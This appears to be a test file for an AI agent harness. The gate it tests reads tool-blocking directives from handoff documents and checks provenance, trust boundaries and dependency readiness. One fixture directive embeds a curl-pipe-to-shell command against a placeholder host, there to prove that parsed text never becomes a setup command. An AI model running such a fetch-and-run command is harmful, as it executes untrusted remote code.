import { describe, expect, it } from "bun:test";
import * as child_process from "node:child_process";
import * as fs from "node:fs/promises";
import * as os from "node:os";
import * as path from "node:path";
import { Settings } from "../src/config/settings";
import type { LiefDetailedProbeResult } from "../src/extensibility/lief-install";
import { CONTEXT_NOTES_ENTRY_TYPE } from "../src/session/context-notes";
import { DependencyGate } from "../src/session/dependency-gate";
import {
	getSessionPrerequisiteConstraintGate,
	HANDOFF_DOCUMENT_DETAILS_KEY,
	parseHandoffConstraintDirectives,
	type PrerequisiteConstraintHost,
	setupCommandForDependency,
} from "../src/session/prerequisite-constraints";
import type { SessionEntry } from "../src/session/session-entries";
import type { Tool, ToolSession } from "../src/tools";
import { ElfInspectTool, type ElfQueryDetails } from "../src/tools/elf-inspect";

/** Verbatim directive from the issue #17 handoff document (`handoff-2026-10-25T19-20-10-860Z.md:34`). */
const HISTORICAL_DIRECTIVE = "- Do not repeat `elf_inspect` on libc without installing its missing LIEF prerequisite.";
const HISTORICAL_HANDOFF_FILE = "handoff-2026-10-25T19-20-10-860Z.md";

function createMinimalElf64FileBuffer(): Buffer {
	const buf = Buffer.alloc(64, 0);
	buf[0] = 0x7f;
	buf[1] = 0x45; // 'E'
	buf[2] = 0x4c; // 'L'
	buf[3] = 0x46; // 'F'
	buf[4] = 2; // ELF64
	buf[5] = 1; // LSB
	buf[6] = 1; // EV_CURRENT
	buf.writeUInt16LE(3, 16); // ET_DYN
	buf.writeUInt16LE(0xb7, 18); // EM_AARCH64
	buf.writeUInt32LE(1, 20); // EV_CURRENT
	buf.writeUInt16LE(64, 52); // e_ehsize
	return buf;
}

function createHarnessSession(cwd: string, branchEntries: SessionEntry[] = []): ToolSession {
	const toolRegistry = new Map<string, Tool>();
	const sessionManager = {
		getSessionId: () => "session-prerequisite-constraint-test",
		getBranch: () => branchEntries,
		getEntries: () => branchEntries,
		appendCustomEntry: () => "custom-1",
		ensureOnDisk: async () => {},
		flush: async () => {},
	};
	return {
		cwd,
		hasUI: false,
		getSessionFile: () => path.join(cwd, "session.jsonl"),
		getSessionId: () => "session-prerequisite-constraint-test",
		getSessionSpawns: () => "*",
		settings: Settings.isolated({ "tools.xdev": true }),
		getPlanModeState: () => ({ enabled: false, planFilePath: path.join(cwd, "PLAN.md") }),
		sessionManager,
		toolRegistry,
		getToolByName: (name: string) => toolRegistry.get(name),
		getToolForEvalBridge: (name: string) => toolRegistry.get(name),
		getEvalBridgeToolNames: () => [...toolRegistry.keys()],
	} as unknown as ToolSession;
}

function createHost(options: {
	cwd: string;
	artifactsDir: string | null;
	branch: SessionEntry[];
	sessionId?: string;
}): PrerequisiteConstraintHost {
	const sessionId = options.sessionId ?? "session-prerequisite-constraint-test";
	const sessionManager = {
		getSessionId: () => sessionId,
		getBranch: () => options.branch,
		getArtifactsDir: () => options.artifactsDir,
	};
	return {
		cwd: options.cwd,
		getSessionId: () => sessionId,
		getSessionFile: () => path.join(options.cwd, "session.jsonl"),
		getArtifactsDir: () => options.artifactsDir,
		sessionManager,
	};
}

function handoffCompactionEntry(options: {
	id: string;
	summary: string;
	timestamp?: string;
	details?: Record<string, unknown>;
}): SessionEntry {
	return {
		type: "compaction",
		id: options.id,
		parentId: null,
		timestamp: options.timestamp ?? "2026-10-25T19:20:10.860Z",
		summary: options.summary,
		firstKeptEntryId: "entry-before-handoff",
		tokensBefore: 109194,
		tokensAfter: 37337,
		method: "handoff",
		...(options.details ? { details: options.details } : {}),
	};
}

/** Build a document whose directive sits on an exact 1-based physical line. */
function documentWithDirectiveAtLine(directive: string, line: number, trailingLines = 5): string {
	const lines: string[] = [];
	for (let index = 1; index < line; index++) {
		lines.push(index % 7 === 0 ? "" : `- handoff context line ${index}`);
	}
	lines.push(directive);
	for (let index = 0; index < trailingLines; index++) {
		lines.push(`- trailing handoff note ${index + 1}`);
	}
	return lines.join("\n");
}

async function writeHandoffDocument(
	artifactsDir: string,
	options: { document: string; fileName?: string },
): Promise<string> {
	await fs.mkdir(artifactsDir, { recursive: true });
	const file = path.join(artifactsDir, options.fileName ?? HISTORICAL_HANDOFF_FILE);
	await fs.writeFile(file, `${options.document}\n`);
	// Canonical from creation: the gate reports realpaths, so fixtures must not compare against
	// the pre-resolution form (`/var/...` vs `/private/var/...` on macOS).
	return await fs.realpath(file);
}

describe("Explicit handoff prerequisite constraints (#17)", () => {
	it("blocks the historical handoff directive before backend dispatch with physical file:line provenance", async () => {
		const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "prereq-constraint-provenance-"));
		const artifactsDir = path.join(tempDir, "session-artifacts");
		try {
			const document = documentWithDirectiveAtLine(HISTORICAL_DIRECTIVE, 34);
			const handoffFile = await writeHandoffDocument(artifactsDir, { document });
			const branch: SessionEntry[] = [
				handoffCompactionEntry({
					id: "entry-handoff-document",
					summary: `${document}\n\n<files>\nhandoff context (Read)\n</files>`,
					details: { [HANDOFF_DOCUMENT_DETAILS_KEY]: handoffFile },
				}),
			];
			const host = createHost({ cwd: tempDir, artifactsDir, branch });
			const gate = getSessionPrerequisiteConstraintGate(host, {
				probeDependency: async () => ({ status: "missing", detail: "LIEF Python library is not available." }),
			});
			// One canonical gate per session manager: directive hooks and bridges share it.
			expect(getSessionPrerequisiteConstraintGate(host)).toBe(gate);

			const constraints = gate.listConstraints();
			expect(constraints).toHaveLength(1);
			expect(constraints[0]).toMatchObject({
				toolName: "elf_inspect",
				dependencyId: "lief",
				setupCommand: setupCommandForDependency("lief"),
				sourceFile: handoffFile,
				sourceLine: 34,
				sourceKind: "handoff_file",
				sourceEntryId: "entry-handoff-document",
				sourceText: HISTORICAL_DIRECTIVE,
			});

			let backendDispatches = 0;
			const blocked = await gate.check({
				toolName: "elf_inspect",
				args: { action: "query", path: "artifacts/realsdk/device_libc.so" },
				toolCallId: "call-historical-directive",
			});
			if (!blocked) backendDispatches += 1;
			expect(backendDispatches).toBe(0);
			expect(blocked?.reason).toContain(`${handoffFile}:34`);
			expect(blocked?.reason).toContain("reverse setup reverse lief");
			expect(blocked).toMatchObject({
				status: "blocked_prerequisite_constraint",
				sourceKind: "handoff_file",
				sourceFile: handoffFile,
				sourceLine: 34,
				missingDependency: "lief",
			});

			const block = await gate.check({
				toolName: "elf_inspect",
				args: { action: "query", path: "artifacts/realsdk/device_libc.so" },
				toolCallId: "call-historical-directive-2",
			});
			expect(block).toMatchObject({
				status: "blocked_prerequisite_constraint",
				deterministicFailure: true,
				toolName: "elf_inspect",
				action: "query",
				missingDependency: "lief",
				setupCommand: "reverse setup reverse lief",
			});
		} finally {
			await fs.rm(tempDir, { recursive: true, force: true });
		}
	});

	it("rejects a real elf_inspect query before the tool's own LIEF probe and worker, then dispatches once readiness verifies", async () => {
		const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "prereq-constraint-elf-"));
		try {
			const elfPath = path.join(tempDir, "libc.so");
			await fs.writeFile(elfPath, createMinimalElf64FileBuffer());
			const document = documentWithDirectiveAtLine(HISTORICAL_DIRECTIVE, 34);
			const branch: SessionEntry[] = [
				// A shaken tool result proves compaction elision never hides the handoff document.
				{
					type: "message",
					id: "entry-shaken-result",
					parentId: null,
					timestamp: "2026-10-25T21:17:54.883Z",
					message: {
						role: "toolResult",
						toolCallId: "call-before-handoff",
						toolName: "elf_inspect",
						content: [{ type: "text", text: "[shaken ~26 tokens — recover: artifact://389 (region 13)]" }],
						details: {},
						isError: true,
						timestamp: Date.parse("2026-10-25T21:17:54.883Z"),
					},
				},
				handoffCompactionEntry({ id: "entry-handoff-history", summary: document }),
			];
			const session = createHarnessSession(tempDir, branch);
			let dependencyReady = false;
			const constraintGate = getSessionPrerequisiteConstraintGate(session, {
				probeDependency: async () =>
					dependencyReady ? { status: "ready" } : { status: "missing", detail: "LIEF is missing." },
			});

			let liefProbeCalls = 0;
			let workerCalls = 0;
			const liefFailureFingerprint = "fp:lief-missing";
			const tool = new ElfInspectTool(session, {
				gate: new DependencyGate(session),
				computeFingerprint: () => liefFailureFingerprint,
				resolveLiefDetailed: async (): Promise<LiefDetailedProbeResult> => {
					liefProbeCalls += 1;
					if (!dependencyReady) {
						return {
							status: "missing_module",
							available: false,
							deterministic: true,
							pythonBin: "/usr/bin/python3",
							version: null,
							modulePath: null,
							error: "No module named 'lief'",
							readinessFingerprint: liefFailureFingerprint,
							checkedCandidates: ["/usr/bin/python3"],
						};
					}
					return {
						status: "available",
						available: true,
						deterministic: true,
						pythonBin: "/usr/bin/python3",
						version: "1.0.0",
						modulePath: "/venv/lib/python3.11/site-packages/lief/__init__.py",
						readinessFingerprint: "fp:lief-ready",
						checkedCandidates: ["/usr/bin/python3"],
					};
				},
				runWorker: async () => {
					workerCalls += 1;
					return {
						status: "ok",
						result: { status: "ok", result: { header: { machine: "AARCH64", bitness: 64 } } },
					};
				},
			});

			const blocked = await constraintGate.check({
				toolName: "elf_inspect",
				args: { action: "query", path: elfPath },
				toolCallId: "call-blocked-before-backend",
			});
			if (!blocked) await tool.execute("call-blocked-before-backend", { action: "query", path: elfPath });
			expect(blocked?.reason).toContain("handoff://entry-handoff-history:34");
			expect(blocked?.sourceKind).toBe("handoff_compaction");
			expect(liefProbeCalls).toBe(0);
			expect(workerCalls).toBe(0);

			dependencyReady = true;
			const allowed = await constraintGate.check({
				toolName: "elf_inspect",
				args: { action: "query", path: elfPath },
				toolCallId: "call-after-install",
			});
			expect(allowed).toBeUndefined();
			const result = await tool.execute("call-after-install", { action: "query", path: elfPath });
			expect(result.isError).toBeUndefined();
			expect((result.details as ElfQueryDetails).action).toBe("query");
			expect(workerCalls).toBe(1);
			expect(liefProbeCalls).toBe(1);
		} finally {
			await fs.rm(tempDir, { recursive: true, force: true });
		}
	});

	it("gates another catalog dependency (triton_analyze/triton) and leaves unrelated tools untouched", async () => {
		const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "prereq-constraint-generic-"));
		try {
			const document = [
				"# Active constraints",
				"- Do not repeat `triton_analyze` until triton is installed.",
				"- Do not call `r2_inspect` before installing radare2.",
				"- Do not repeat `bash` until lief is installed.",
				"",
			].join("\n");
			const artifactsDir = path.join(tempDir, "session-artifacts");
			const handoffFile = await writeHandoffDocument(artifactsDir, {
				fileName: "handoff-2026-10-25T20-00-00-000Z.md",
				document,
			});
			const branch: SessionEntry[] = [
				handoffCompactionEntry({
					id: "entry-generic-handoff",
					timestamp: "2026-10-25T20:00:00.000Z",
					summary: document,
					details: { [HANDOFF_DOCUMENT_DETAILS_KEY]: handoffFile },
				}),
			];
			const host = createHost({ cwd: tempDir, artifactsDir, branch });
			const readiness: Record<string, { status: "ready" } | { status: "missing" }> = {
				triton: { status: "missing" },
				radare2: { status: "ready" },
			};
			const gate = getSessionPrerequisiteConstraintGate(host, {
				probeDependency: async dependencyId => readiness[dependencyId] ?? { status: "unknown" },
			});

			const constraints = gate.listConstraints();
			expect(constraints.map(constraint => `${constraint.toolName}:${constraint.dependencyId}`)).toEqual([
				"triton_analyze:triton",
				"r2_inspect:radare2",
			]);
			expect(constraints.map(constraint => constraint.sourceLine)).toEqual([2, 3]);

			const tritonBlock = await gate.check({ toolName: "triton_analyze", args: { action: "replay" } });
			expect(tritonBlock).toMatchObject({
				toolName: "triton_analyze",
				missingDependency: "triton",
				setupCommand: "reverse setup reverse triton",
				sourceFile: handoffFile,
				sourceLine: 2,
			});
			// Verified ready dependency unlocks without a per-tool wrapper.
			expect(await gate.check({ toolName: "r2_inspect", args: { action: "disassemble" } })).toBeUndefined();
			// No constraint, or no catalog dependency edge, means no block.
			expect(await gate.check({ toolName: "elf_inspect", args: { action: "query" } })).toBeUndefined();
			expect(await gate.check({ toolName: "bash", args: { command: "ls" } })).toBeUndefined();
			expect(await gate.check({ toolName: "triage", args: { path: "libc.so" } })).toBeUndefined();
		} finally {
			await fs.rm(tempDir, { recursive: true, force: true });
		}
	});

	it("keeps quoted, fenced, example, prose, over-long and retracted directives inactive", () => {
		const text = [
			"# Handoff",
			"```md",
			HISTORICAL_DIRECTIVE,
			"```",
			`> ${HISTORICAL_DIRECTIVE}`,
			"## Examples",
			"- Do not repeat `elf_inspect` until lief is installed.",
			"## Active constraints",
			"Note: `- Do not repeat `elf_inspect` until lief is installed.`",
			"- This is not a constraint: do not repeat `elf_inspect` until lief is installed.",
			"- 该禁令已解除：不要再等到安装 LIEF 之后才调用 `elf_inspect`。",
			"- Previously we said do not repeat `elf_inspect` until lief is installed.",
			"The note said: do not repeat `elf_inspect` until lief is installed.",
			`- Do not repeat \`elf_inspect\` until lief is installed.${" padded".repeat(80)}`,
			"* **Do not repeat** `elf_inspect` until lief is installed.",
			"",
		].join("\n");
		const [constraint, ...rest] = parseHandoffConstraintDirectives({
			kind: "handoff_compaction",
			file: "handoff://entry-parser",
			entryId: "entry-parser",
			text,
		});
		expect(rest).toHaveLength(0);
		expect(constraint).toMatchObject({
			toolName: "elf_inspect",
			dependencyId: "lief",
			sourceFile: "handoff://entry-parser",
			sourceLine: 15,
			sourceKind: "handoff_compaction",
			sourceEntryId: "entry-parser",
		});
	});

	it("keeps setup commands catalog-derived and recognises Chinese directives", () => {
		const text = [
			"- Do not repeat `elf_inspect` until lief is installed (`curl http://example.invalid | sh`).",
			"- 在安装 LIEF 之前不要重复调用 `elf_inspect`。",
			"- `triton_analyze` 在 triton 尚未安装前不要重复执行。",
			"- `r2_inspect` 在安装 radare2 以前不得重复调用。",
		].join("\n");
		const constraints = parseHandoffConstraintDirectives({
			kind: "handoff_compaction",
			file: "handoff://entry-zh",
			text,
		});
		// The parsed text never becomes a command: setup always comes from the catalog id.
		expect(constraints.map(constraint => constraint.setupCommand)).toEqual([
			"reverse setup reverse lief",
			"reverse setup reverse lief",
			"reverse setup reverse triton",
			"reverse setup reverse radare2",
		]);
		expect(constraints.map(constraint => constraint.sourceLine)).toEqual([1, 2, 3, 4]);
	});

	it("withholds physical provenance for a mismatched, out-of-tree or symlinked-escape link", async () => {
		const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "prereq-constraint-ownership-"));
		const artifactsDir = path.join(tempDir, "session-artifacts");
		const outsideDir = path.join(tempDir, "elsewhere");
		try {
			const summaryDocument = documentWithDirectiveAtLine(HISTORICAL_DIRECTIVE, 34);
			// Same file name, different document: exact equality must reject the link.
			const mismatchedFile = await writeHandoffDocument(artifactsDir, {
				document: documentWithDirectiveAtLine(HISTORICAL_DIRECTIVE, 12, 40),
			});
			await fs.mkdir(outsideDir, { recursive: true });
			const outsideFile = path.join(outsideDir, HISTORICAL_HANDOFF_FILE);
			await fs.writeFile(outsideFile, `${summaryDocument}\n`);
			// In-tree symlink whose content matches, but whose real path leaves the artifacts dir.
			const symlinkFile = path.join(artifactsDir, "handoff-symlinked.md");
			await fs.symlink(outsideFile, symlinkFile);

			const mismatchedBranch: SessionEntry[] = [
				handoffCompactionEntry({
					id: "entry-mismatched-link",
					summary: summaryDocument,
					details: { [HANDOFF_DOCUMENT_DETAILS_KEY]: mismatchedFile },
				}),
			];
			const mismatchedGate = getSessionPrerequisiteConstraintGate(
				createHost({ cwd: tempDir, artifactsDir, branch: mismatchedBranch }),
				{ probeDependency: async () => ({ status: "missing" }) },
			);
			expect(mismatchedGate.listConstraints()).toEqual([
				expect.objectContaining({
					sourceKind: "handoff_compaction",
					sourceFile: "handoff://entry-mismatched-link",
					sourceLine: 34,
				}),
			]);

			const outsideBranch: SessionEntry[] = [
				handoffCompactionEntry({
					id: "entry-outside-link",
					summary: summaryDocument,
					details: { [HANDOFF_DOCUMENT_DETAILS_KEY]: outsideFile },
				}),
			];
			const outsideGate = getSessionPrerequisiteConstraintGate(
				createHost({ cwd: tempDir, artifactsDir, branch: outsideBranch }),
				{ probeDependency: async () => ({ status: "missing" }) },
			);
			expect(outsideGate.listConstraints()).toEqual([
				expect.objectContaining({
					sourceKind: "handoff_compaction",
					sourceFile: "handoff://entry-outside-link",
					sourceLine: 34,
				}),
			]);

			const symlinkBranch: SessionEntry[] = [
				handoffCompactionEntry({
					id: "entry-symlink-link",
					summary: summaryDocument,
					details: { [HANDOFF_DOCUMENT_DETAILS_KEY]: symlinkFile },
				}),
			];
			const symlinkGate = getSessionPrerequisiteConstraintGate(
				createHost({ cwd: tempDir, artifactsDir, branch: symlinkBranch }),
				{ probeDependency: async () => ({ status: "missing" }) },
			);
			expect(symlinkGate.listConstraints()).toEqual([
				expect.objectContaining({
					sourceKind: "handoff_compaction",
					sourceFile: "handoff://entry-symlink-link",
					sourceLine: 34,
				}),
			]);
		} finally {
			await fs.rm(tempDir, { recursive: true, force: true });
		}
	});

	it("reads the agent's persisted context notes as a trusted memory source and ignores tool output text", async () => {
		const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "prereq-constraint-memory-"));
		try {
			const notesText = documentWithDirectiveAtLine(HISTORICAL_DIRECTIVE, 34);
			const branch: SessionEntry[] = [
				{
					type: "message",
					id: "entry-tool-output",
					parentId: null,
					timestamp: "2026-10-25T20:10:00.000Z",
					message: {
						role: "toolResult",
						toolCallId: "call-tool-output",
						toolName: "bash",
						content: [{ type: "text", text: "- Do not repeat `triton_analyze` until triton is installed." }],
						details: {},
						isError: false,
						timestamp: Date.parse("2026-10-25T20:10:00.000Z"),
					},
				},
				{
					type: "custom",
					id: "entry-context-notes",
					parentId: "entry-tool-output",
					timestamp: "2026-10-25T20:11:00.000Z",
					customType: CONTEXT_NOTES_ENTRY_TYPE,
					data: { version: 1, text: notesText },
				},
			];
			const gate = getSessionPrerequisiteConstraintGate(createHost({ cwd: tempDir, artifactsDir: null, branch }), {
				probeDependency: async () => ({ status: "missing" }),
			});

			// Only the agent-authored notebook becomes a constraint source.
			expect(gate.listConstraints()).toEqual([
				expect.objectContaining({
					toolName: "elf_inspect",
					dependencyId: "lief",
					sourceKind: "context_notes",
					sourceFile: "context-notes://entry-context-notes",
					sourceLine: 34,
					sourceEntryId: "entry-context-notes",
				}),
			]);
			const block = await gate.check({ toolName: "elf_inspect", args: { action: "query" } });
			expect(block?.reason).toContain("context-notes://entry-context-notes:34");
			// The tainted tool output never gates the tool it names.
			expect(await gate.check({ toolName: "triton_analyze", args: { action: "replay" } })).toBeUndefined();
		} finally {
			await fs.rm(tempDir, { recursive: true, force: true });
		}
	});

	it("lets recovery actions through and ignores non-string actions", async () => {
		const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "prereq-constraint-recovery-"));
		try {
			const document = documentWithDirectiveAtLine(HISTORICAL_DIRECTIVE, 34);
			const artifactsDir = path.join(tempDir, "session-artifacts");
			const handoffFile = await writeHandoffDocument(artifactsDir, { document });
			const branch: SessionEntry[] = [
				handoffCompactionEntry({
					id: "entry-recovery",
					summary: document,
					details: { [HANDOFF_DOCUMENT_DETAILS_KEY]: handoffFile },
				}),
			];
			const gate = getSessionPrerequisiteConstraintGate(createHost({ cwd: tempDir, artifactsDir, branch }), {
				probeDependency: async () => ({ status: "missing" }),
			});
			expect(await gate.check({ toolName: "elf_inspect", args: { action: "status" } })).toBeUndefined();
			expect(await gate.check({ toolName: "elf_inspect", args: { action: "Setup" } })).toBeUndefined();
			expect(await gate.check({ toolName: "elf_inspect", args: { action: 7 } })).toMatchObject({
				status: "blocked_prerequisite_constraint",
				action: "execute",
			});
		} finally {
			await fs.rm(tempDir, { recursive: true, force: true });
		}
	});

	it("rehydrates after a restart from compaction history alone, then unlocks and re-blocks on readiness changes", async () => {
		const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "prereq-constraint-restart-"));
		try {
			const document = documentWithDirectiveAtLine(HISTORICAL_DIRECTIVE, 34);
			const branch: SessionEntry[] = [handoffCompactionEntry({ id: "entry-restart", summary: document })];
			let dependencyReady = false;
			let now = 1_000_000;
			const probeDependency = async () =>
				dependencyReady ? { status: "ready" as const } : { status: "missing" as const, detail: "missing" };
			const gateDeps = { probeDependency, now: () => now };

			const beforeRestart = getSessionPrerequisiteConstraintGate(
				createHost({ cwd: tempDir, artifactsDir: null, branch, sessionId: "session-restart" }),
				gateDeps,
			);
			const firstBlock = await beforeRestart.check({ toolName: "elf_inspect", args: { action: "query" } });
			expect(firstBlock).toMatchObject({
				sourceKind: "handoff_compaction",
				sourceFile: "handoff://entry-restart",
				sourceEntryId: "entry-restart",
				sourceLine: 34,
			});

			// Restart: a fresh session manager and gate reparse the surviving compaction entry.
			const afterRestart = getSessionPrerequisiteConstraintGate(
				createHost({ cwd: tempDir, artifactsDir: null, branch: [...branch], sessionId: "session-restart" }),
				gateDeps,
			);
			expect(afterRestart).not.toBe(beforeRestart);
			expect(afterRestart.listConstraints()).toHaveLength(1);
			expect(await afterRestart.check({ toolName: "elf_inspect", args: { action: "query" } })).toMatchObject({
				sourceFile: "handoff://entry-restart",
				sourceLine: 34,
			});

			// An install is effective on the very next call: confirmed misses are never cached.
			dependencyReady = true;
			expect(await afterRestart.check({ toolName: "elf_inspect", args: { action: "query" } })).toBeUndefined();

			// The verified-ready result is cached briefly; once that bounded window lapses the
			// dependency is re-verified and a now-missing toolchain blocks the call again.
			dependencyReady = false;
			now += 61_000;
			expect(await afterRestart.check({ toolName: "elf_inspect", args: { action: "query" } })).toMatchObject({
				missingDependency: "lief",
				sourceFile: "handoff://entry-restart",
			});

			// A reset boundary ends the visible transcript: pre-reset handoff directives stop
			// being contracts, exactly like the context notes they sit beside.
			const resetBranch: SessionEntry[] = [
				...branch,
				{
					type: "reset_boundary",
					id: "entry-reset-boundary",
					parentId: "entry-restart",
					timestamp: "2026-10-25T22:00:00.000Z",
				},
			];
			const afterReset = getSessionPrerequisiteConstraintGate(
				createHost({ cwd: tempDir, artifactsDir: null, branch: resetBranch, sessionId: "session-reset" }),
				gateDeps,
			);
			expect(afterReset.listConstraints()).toHaveLength(0);
			expect(await afterReset.check({ toolName: "elf_inspect", args: { action: "query" } })).toBeUndefined();
		} finally {
			await fs.rm(tempDir, { recursive: true, force: true });
		}
	});

	it("shares one readiness probe across concurrent tool fanout and never blocks on transient probe errors", async () => {
		const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "prereq-constraint-singleflight-"));
		try {
			const document = documentWithDirectiveAtLine(HISTORICAL_DIRECTIVE, 34);
			const artifactsDir = path.join(tempDir, "session-artifacts");
			const handoffFile = await writeHandoffDocument(artifactsDir, { document });
			const branch: SessionEntry[] = [
				handoffCompactionEntry({
					id: "entry-singleflight",
					summary: document,
					details: { [HANDOFF_DOCUMENT_DETAILS_KEY]: handoffFile },
				}),
			];
			let now = 1_000_000;
			let probeCalls = 0;
			let probeMode: "transient" | "missing" = "transient";
			let releaseProbe = () => {};
			const probeGate = new Promise<void>(resolve => {
				releaseProbe = resolve;
			});
			const gate = getSessionPrerequisiteConstraintGate(createHost({ cwd: tempDir, artifactsDir, branch }), {
				now: () => now,
				probeDependency: async () => {
					probeCalls += 1;
					await probeGate;
					if (probeMode === "transient") throw new Error("spawnSync ETIMEDOUT");
					return { status: "missing", detail: "lief missing" };
				},
			});

			const pending = Array.from({ length: 6 }, (_unused, index) =>
				gate.check({ toolName: "elf_inspect", args: { action: "query" }, toolCallId: `call-fanout-${index}` }),
			);
			// Fan-out coalesces on the in-flight probe before it settles.
			expect(probeCalls).toBe(1);
			releaseProbe();
			const concurrent = await Promise.all(pending);
			// A probe that could not run is allow-by-default, never a permanent block.
			expect(concurrent.every(block => block === undefined)).toBe(true);
			expect(probeCalls).toBe(1);

			// After the short transient grace, a real probe re-runs and can confirm the miss.
			probeMode = "missing";
			now += 10_000;
			const blocked = await gate.check({ toolName: "elf_inspect", args: { action: "query" }, toolCallId: "call-1" });
			expect(blocked).toMatchObject({
				status: "blocked_prerequisite_constraint",
				sourceFile: handoffFile,
				sourceLine: 34,
				deterministicFailure: true,
			});
			expect(probeCalls).toBe(2);
		} finally {
			await fs.rm(tempDir, { recursive: true, force: true });
		}
	});

	it("controlled LIEF smoke: real Python probe in an isolated venv blocks with file:line, reuses the recorded probe, and invalidates on site-packages change", async () => {
		const hostPython = Bun.which("python3") ?? Bun.which("python");
		if (!hostPython) return;

		const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "prereq-constraint-real-probe-"));
		const venvDir = path.join(tempDir, "tools", "lief-venv");
		const artifactsDir = path.join(tempDir, "session-artifacts");
		try {
			const venvCreate = child_process.spawnSync(hostPython, ["-m", "venv", "--without-pip", venvDir], {
				timeout: 15000,
				encoding: "utf8",
			});
			if (venvCreate.status !== 0) return;

			const venvPython =
				process.platform === "win32"
					? path.join(venvDir, "Scripts", "python.exe")
					: path.join(venvDir, "bin", "python");
			const isolatedEnv: Record<string, string | undefined> = { PATH: "", LIEF_PYTHON: venvPython, HOME: tempDir };
			const document = documentWithDirectiveAtLine(HISTORICAL_DIRECTIVE, 34);
			const handoffFile = await writeHandoffDocument(artifactsDir, { document });
			const branch: SessionEntry[] = [
				handoffCompactionEntry({
					id: "entry-real-probe",
					summary: document,
					details: { [HANDOFF_DOCUMENT_DETAILS_KEY]: handoffFile },
				}),
			];
			const gate = getSessionPrerequisiteConstraintGate(createHost({ cwd: tempDir, artifactsDir, branch }), {
				liefOptions: { env: isolatedEnv, agentDir: tempDir, which: () => null },
			});

			const first = await gate.check({
				toolName: "elf_inspect",
				args: { action: "query" },
				toolCallId: "real-probe-call-1",
			});
			expect(first).toMatchObject({
				status: "blocked_prerequisite_constraint",
				missingDependency: "lief",
				failureKind: "missing_module",
				sourceFile: handoffFile,
				sourceLine: 34,
				attemptCount: 1,
			});
			const firstFingerprint = first?.readinessFingerprint;
			expect(first?.reason).toContain(`${handoffFile}:34`);
			expect(first?.reason).toContain("reverse setup reverse lief");

			// Same readiness fingerprint: the canonical gate record answers without a new Python spawn.
			const second = await gate.check({
				toolName: "elf_inspect",
				args: { action: "query" },
				toolCallId: "real-probe-call-2",
			});
			expect(second).toMatchObject({
				readinessFingerprint: firstFingerprint,
				attemptCount: 2,
				sourceToolCallId: "real-probe-call-1",
			});

			// Real site-packages mutation invalidates the fingerprint, so the next check probes fresh.
			const sitePackages = child_process.spawnSync(
				venvPython,
				["-c", "import site; print(site.getsitepackages()[0])"],
				{ encoding: "utf8", timeout: 5000 },
			);
			expect(sitePackages.status).toBe(0);
			await fs.mkdir(path.join(sitePackages.stdout.trim(), "lief-1.0.0.dist-info"), { recursive: true });

			const third = await gate.check({
				toolName: "elf_inspect",
				args: { action: "query" },
				toolCallId: "real-probe-call-3",
			});
			expect(third?.readinessFingerprint).not.toBe(firstFingerprint);
			expect(third).toMatchObject({ attemptCount: 1, sourceToolCallId: "real-probe-call-3" });
		} finally {
			await fs.rm(tempDir, { recursive: true, force: true });
		}
	});
});
